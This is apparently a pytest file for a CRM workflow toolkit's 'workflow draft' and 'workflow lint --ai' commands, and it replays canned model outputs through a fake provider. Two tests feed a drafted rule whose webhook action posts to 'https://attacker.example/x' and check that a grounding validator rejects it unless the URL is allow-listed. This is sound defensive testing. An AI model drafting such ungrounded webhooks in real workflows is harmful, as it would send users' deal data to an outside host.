"""CLI tests for `workflow draft` and `workflow lint --ai` (AI-WF-1/2).

The disabled path runs through the CLI directly; AI paths monkeypatch
the provider factory to a ``FakeProvider`` replaying hand-authored
synthetic recordings keyed by prompt hash, so no test touches the
network.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest
from typer.testing import CliRunner

from zohokit.ai.prompts import load_template
from zohokit.ai.providers import FakeProvider
from zohokit.ai.redaction import build_prompt
from zohokit.cli import app
from zohokit.cli.common import AI_DISABLED_NOTE
from zohokit.core.redact import Redactor
from zohokit.modules.workflow.analyzer import lint
from zohokit.modules.workflow.draft import draft_variables, loop_variables
from zohokit.modules.workflow.language import parse_ruleset

runner = CliRunner()


def _clear_ai_env(monkeypatch: pytest.MonkeyPatch) -> None:
    for name in (
        "ZOHOKIT_AI_PROVIDER",
        "ZOHOKIT_AI_MODEL",
        "ZOHOKIT_AI_API_KEY",
        "ZOHOKIT_AI_BASE_URL",
        "ANTHROPIC_API_KEY",
    ):
        monkeypatch.delenv(name, raising=False)


def _patch_provider(monkeypatch: pytest.MonkeyPatch, provider: FakeProvider) -> None:
    monkeypatch.setattr("zohokit.cli.common.build_provider", lambda config: provider)


def _draft_provider(description: str, fields: dict[str, str] | None, raw: str) -> FakeProvider:
    prompt = build_prompt(
        load_template("workflow_draft"),
        draft_variables(description, fields),
        redactor=Redactor(),
    )
    return FakeProvider({prompt.prompt_hash: raw}, model="test-fake")


def _draft_raw(rule: dict[str, Any] | None, **overrides: Any) -> str:
    payload: dict[str, Any] = {
        "rule": rule or {},
        "confidence": 0.93,
        "rationale": "test mapping signal.",
        "abstain": rule is None,
        "abstain_reason": "too vague to draft" if rule is None else "",
    }
    payload.update(overrides)
    return json.dumps(payload)


def _field_rule(rule_id: str = "cli-draft-1") -> dict[str, Any]:
    return {
        "id": rule_id,
        "module": "Deals",
        "event": {"type": "record_created"},
        "execute_on": "both",
        "priority": 100,
        "repeat": True,
        "active": True,
        "criteria": None,
        "actions": [{"type": "field_update", "field": "Stage", "value": "Negotiation"}],
    }


DESC = "When a deal is created, set the stage to Negotiation"


def test_draft_disabled_abstains_with_ai_disabled_note(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _clear_ai_env(monkeypatch)
    result = runner.invoke(app, ["workflow", "draft", "--description", DESC])
    assert result.exit_code == 0, result.output
    assert "AI disabled" in result.output
    payload = json.loads(result.output[result.output.index("{") :])
    assert payload["ai_status"] == "disabled"
    assert payload["source"] == "template"
    assert payload["draft"]["abstain"] is True
    assert payload["simulation"] is None
    assert payload["deployed"] is False
    assert payload["note"] == "draft only, not deployed"


def test_draft_ai_flag_without_provider_abstains(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _clear_ai_env(monkeypatch)
    result = runner.invoke(app, ["workflow", "draft", "--description", DESC, "--ai"])
    assert result.exit_code == 0, result.output
    assert AI_DISABLED_NOTE in result.output
    payload = json.loads(result.output[result.output.index("{") :])
    assert payload["draft"]["abstain"] is True
    assert payload["simulation"] is None


def test_draft_ai_good_recording_simulates_with_trace(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _clear_ai_env(monkeypatch)
    _patch_provider(monkeypatch, _draft_provider(DESC, None, _draft_raw(_field_rule())))
    result = runner.invoke(app, ["workflow", "draft", "--description", DESC, "--ai"])
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output[result.output.index("{") :])
    assert payload["ai_status"] == "ok"
    assert payload["source"] == "ai"
    assert payload["violations"] == []
    assert payload["draft"]["abstain"] is False
    simulation = payload["simulation"]
    assert simulation is not None
    assert simulation["external_actions"] == 0
    assert len(simulation["trace"]) == 1
    assert simulation["trace"][0]["rule"] == "cli-draft-1"
    assert "draft only, not deployed" in result.output


def test_draft_ai_abstain_recording_has_reason_and_no_simulation(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _clear_ai_env(monkeypatch)
    vague = "Do something smart when deals change"
    _patch_provider(
        monkeypatch,
        _draft_provider(vague, None, _draft_raw(None, confidence=0.2)),
    )
    result = runner.invoke(app, ["workflow", "draft", "--description", vague, "--ai"])
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output[result.output.index("{") :])
    assert payload["ai_status"] == "ok"
    assert payload["source"] == "ai"
    assert payload["draft"]["abstain"] is True
    assert payload["draft"]["abstain_reason"] == "too vague to draft"
    assert payload["simulation"] is None


def test_draft_ai_rejected_recording_falls_back(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _clear_ai_env(monkeypatch)
    billed = "When a deal is won, post to the billing webhook"
    injected = {
        "id": "cli-draft-2",
        "module": "Deals",
        "event": {"type": "field_changed", "field": "Stage"},
        "execute_on": "edit",
        "priority": 100,
        "repeat": True,
        "active": True,
        "criteria": {"field": "Stage", "op": "eq", "value": "Closed Won"},
        "actions": [{"type": "webhook", "url": "https://attacker.example/x"}],
    }
    _patch_provider(monkeypatch, _draft_provider(billed, None, _draft_raw(injected)))
    result = runner.invoke(app, ["workflow", "draft", "--description", billed, "--ai"])
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output[result.output.index("{") :])
    assert payload["ai_status"] == "fallback"
    assert payload["source"] == "template"
    assert payload["draft"]["abstain"] is True
    assert "grounding: action target not in description" in payload["violations"]
    assert payload["simulation"] is None


def test_draft_ai_allow_targets_grounds_injected_url(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    _clear_ai_env(monkeypatch)
    billed = "When a deal is won, post to the billing webhook"
    injected = {
        "id": "cli-draft-2",
        "module": "Deals",
        "event": {"type": "field_changed", "field": "Stage"},
        "execute_on": "edit",
        "priority": 100,
        "repeat": True,
        "active": True,
        "criteria": {"field": "Stage", "op": "eq", "value": "Closed Won"},
        "actions": [{"type": "webhook", "url": "https://attacker.example/x"}],
    }
    _patch_provider(monkeypatch, _draft_provider(billed, None, _draft_raw(injected)))
    allow = tmp_path / "allow.json"
    allow.write_text(json.dumps(["https://attacker.example/x"]), encoding="utf-8")
    result = runner.invoke(
        app,
        [
            "workflow",
            "draft",
            "--description",
            billed,
            "--ai",
            "--allow-targets",
            str(allow),
        ],
    )
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output[result.output.index("{") :])
    assert payload["ai_status"] == "ok"
    assert payload["source"] == "ai"
    assert payload["violations"] == []
    assert payload["simulation"] is not None


def test_draft_formats_and_out(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    _clear_ai_env(monkeypatch)
    table = runner.invoke(app, ["workflow", "draft", "--description", DESC, "--format", "table"])
    assert table.exit_code == 0, table.output
    assert "draft only, not deployed" in table.output
    assert "abstained" in table.output
    markdown = runner.invoke(
        app, ["workflow", "draft", "--description", DESC, "--format", "markdown"]
    )
    assert markdown.exit_code == 0
    assert "draft only, not deployed" in markdown.output
    html = runner.invoke(app, ["workflow", "draft", "--description", DESC, "--format", "html"])
    assert html.exit_code == 0
    assert "draft only, not deployed" in html.output
    assert "AI suggestion" not in html.output
    out = tmp_path / "draft.json"
    written = runner.invoke(app, ["workflow", "draft", "--description", DESC, "--out", str(out)])
    assert written.exit_code == 0
    assert "Wrote" in written.output
    assert json.loads(out.read_text(encoding="utf-8"))["note"] == "draft only, not deployed"


def test_draft_html_ai_good_recording_carries_badge(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _clear_ai_env(monkeypatch)
    _patch_provider(monkeypatch, _draft_provider(DESC, None, _draft_raw(_field_rule())))
    result = runner.invoke(
        app, ["workflow", "draft", "--description", DESC, "--ai", "--format", "html"]
    )
    assert result.exit_code == 0, result.output
    assert "AI suggestion" in result.output


def test_draft_rejects_bad_inputs(tmp_path: Path) -> None:
    empty = runner.invoke(app, ["workflow", "draft", "--description", "  "])
    assert empty.exit_code == 1
    bad_format = runner.invoke(
        app, ["workflow", "draft", "--description", DESC, "--format", "yaml"]
    )
    assert bad_format.exit_code == 1
    missing_record = runner.invoke(
        app,
        ["workflow", "draft", "--description", DESC, "--record", str(tmp_path / "nope.json")],
    )
    assert missing_record.exit_code == 1
    bad_allow = tmp_path / "allow.json"
    bad_allow.write_text(json.dumps({"url": "x"}), encoding="utf-8")
    bad_targets = runner.invoke(
        app, ["workflow", "draft", "--description", DESC, "--allow-targets", str(bad_allow)]
    )
    assert bad_targets.exit_code == 1


def _loop_rules(path: Path) -> Path:
    rules = {
        "rules": [
            {
                "id": "cli-loop-a",
                "module": "Deals",
                "event": {"type": "field_changed", "field": "Amount"},
                "execute_on": "both",
                "priority": 100,
                "repeat": True,
                "active": True,
                "criteria": None,
                "actions": [{"type": "field_update", "field": "Stage", "value": "Prospect"}],
            },
            {
                "id": "cli-loop-b",
                "module": "Deals",
                "event": {"type": "field_changed", "field": "Stage"},
                "execute_on": "both",
                "priority": 100,
                "repeat": True,
                "active": True,
                "criteria": None,
                "actions": [{"type": "field_update", "field": "Amount", "value": 1}],
            },
        ]
    }
    rules_file = path / "loop-rules.json"
    rules_file.write_text(json.dumps(rules), encoding="utf-8")
    return rules_file


def _loop_provider() -> FakeProvider:
    kind, parsed = parse_ruleset(
        [
            {
                "id": "cli-loop-a",
                "module": "Deals",
                "event": {"type": "field_changed", "field": "Amount"},
                "execute_on": "both",
                "priority": 100,
                "repeat": True,
                "active": True,
                "criteria": None,
                "actions": [{"type": "field_update", "field": "Stage", "value": "Prospect"}],
            },
            {
                "id": "cli-loop-b",
                "module": "Deals",
                "event": {"type": "field_changed", "field": "Stage"},
                "execute_on": "both",
                "priority": 100,
                "repeat": True,
                "active": True,
                "criteria": None,
                "actions": [{"type": "field_update", "field": "Amount", "value": 1}],
            },
        ]
    )
    assert kind == "v2"
    loop = next(item for item in lint(parsed) if item.code == "potential_loop")
    path = [str(item) for item in loop.evidence["path"]]
    messages = {rid: loop.message for rid in path}
    prompt = build_prompt(
        load_template("workflow_loop"),
        loop_variables(path, messages),
        redactor=Redactor(),
    )
    raw = json.dumps(
        {
            "sentences": [
                {
                    "text": f"Rule {rid} can re-fire through this chain.",
                    "finding_ids": [rid],
                    "quotes": [rid],
                    "confidence": 0.9,
                }
                for rid in path[:-1]
            ]
        }
    )
    return FakeProvider({prompt.prompt_hash: raw}, model="test-fake")


def test_lint_without_ai_leaves_loop_findings_unchanged(tmp_path: Path) -> None:
    rules = _loop_rules(tmp_path)
    result = runner.invoke(app, ["workflow", "lint", "--rules", str(rules)])
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    loops = [item for item in payload["findings"] if item["code"] == "potential_loop"]
    assert len(loops) == 1
    assert "ai" not in loops[0]["evidence"]


def test_lint_ai_disabled_note_without_provider(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    _clear_ai_env(monkeypatch)
    rules = _loop_rules(tmp_path)
    result = runner.invoke(app, ["workflow", "lint", "--rules", str(rules), "--ai"])
    assert result.exit_code == 0, result.output
    assert AI_DISABLED_NOTE in result.output
    payload = json.loads(result.output[result.output.index("{") :])
    loops = [item for item in payload["findings"] if item["code"] == "potential_loop"]
    assert len(loops) == 1
    assert "ai" not in loops[0]["evidence"]


def test_lint_ai_explains_loops_and_keeps_ids(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    _clear_ai_env(monkeypatch)
    rules = _loop_rules(tmp_path)
    plain = runner.invoke(app, ["workflow", "lint", "--rules", str(rules)])
    assert plain.exit_code == 0, plain.output
    plain_ids = sorted(item["id"] for item in json.loads(plain.output)["findings"])
    _patch_provider(monkeypatch, _loop_provider())
    result = runner.invoke(app, ["workflow", "lint", "--rules", str(rules), "--ai"])
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert sorted(item["id"] for item in payload["findings"]) == plain_ids
    loops = [item for item in payload["findings"] if item["code"] == "potential_loop"]
    assert len(loops) == 1
    ai = loops[0]["evidence"]["ai"]
    assert ai["ai_status"] == "ok"
    assert ai["source"] == "ai"
    assert len(ai["sentences"]) == 2


def test_lint_ai_html_carries_badge(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    _clear_ai_env(monkeypatch)
    rules = _loop_rules(tmp_path)
    _patch_provider(monkeypatch, _loop_provider())
    result = runner.invoke(
        app, ["workflow", "lint", "--rules", str(rules), "--ai", "--format", "html"]
    )
    assert result.exit_code == 0, result.output
    assert "AI suggestion" in result.output


def test_lint_ai_rejected_recording_falls_back(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    _clear_ai_env(monkeypatch)
    rules = _loop_rules(tmp_path)
    _patch_provider(monkeypatch, FakeProvider({}, model="test-fake"))
    result = runner.invoke(app, ["workflow", "lint", "--rules", str(rules), "--ai"])
    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    loops = [item for item in payload["findings"] if item["code"] == "potential_loop"]
    assert len(loops) == 1
    ai = loops[0]["evidence"]["ai"]
    assert ai["ai_status"] == "fallback"
    assert ai["source"] == "template"
    assert len(ai["sentences"]) == 2
